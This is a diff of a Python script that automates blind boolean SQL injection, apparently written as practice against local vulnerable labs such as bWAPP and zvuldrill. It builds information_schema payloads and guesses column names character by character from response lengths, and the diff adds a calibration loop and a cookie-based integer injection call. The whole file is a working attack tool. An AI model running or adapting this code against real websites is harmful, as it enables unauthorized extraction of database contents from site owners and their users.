@@ -1,12 +1,10 @@
 # -*-coding:utf-8-*-
 
 # http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?action=go&movie=100 or if((select ascii(substr((select column_name from information_schema.columns where table_name=0x61646D696E limit 0,1),1,1))=97),1,0)
-import urllib
-from urllib import request
-from data import glovar, glofun
+from global_data import glovar, glofun
 
 
-def get_coname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1', cookie=False, type='search',
+def get_coname(url=glovar.url3, cookie=False, type='search',
                tbname='admin', cocount=3):
     response_length = 0
 
@@ -14,7 +12,7 @@ def get_coname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sear
 
     coname_list = []
 
-    hex_tbname = glofun.hex_convert(tbname)
+    hex_tbname = glofun.string_convert_to_hex(tbname)
 
     if type == 'int':
         payload = '+or+if((select+ascii(substr((select+column_name+from+information_schema.columns+where+table_name=' + hex_tbname + '+limit+{coname_order_number},1),{coname_str_location},1))={ascii_number}),1,0)'
@@ -28,6 +26,16 @@ def get_coname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sear
                 "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]
 
     # _ 95    NULL 0
+    for j in payloads:
+
+        full_payload = url + payload.format(coname_order_number=str(0), coname_str_location=str(1),
+                                            ascii_number=str(j))
+
+        url_read_length = len(glofun.url_request(full_payload, cookie))
+
+        if (url_read_length - response_length) > 50:
+            response_length = url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包
+
 
     for i in range(0, cocount):
 
@@ -38,19 +46,9 @@ def get_coname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sear
                 full_payload = url + payload.format(coname_order_number=str(i), coname_str_location=str(k),
                                                     ascii_number=str(j))
 
-                url_read = glofun.url_request(full_payload, cookie)
+                url_read_length = len(glofun.url_request(full_payload, cookie))
 
-                url_read_length = len(url_read)
-
-                if (url_read_length - response_length) > 50:
-
-                    response_length = url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包
-
-                    coname = chr(int(j))
-
-                    print(coname)
-
-                elif (response_length - url_read_length) < 50:  # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包
+                if (response_length - url_read_length) < 50:  # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包
 
                     if k != 1:
 
@@ -83,6 +81,6 @@ def get_coname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sear
 
 if __name__ == "__main__":
 
-    get_coname(url=glovar.url3,tbname='comment')
+    #get_coname(url=glovar.url3,tbname='comment')
 
-    #get_coname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies',cocount=7)
+    get_coname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', cocount=7)
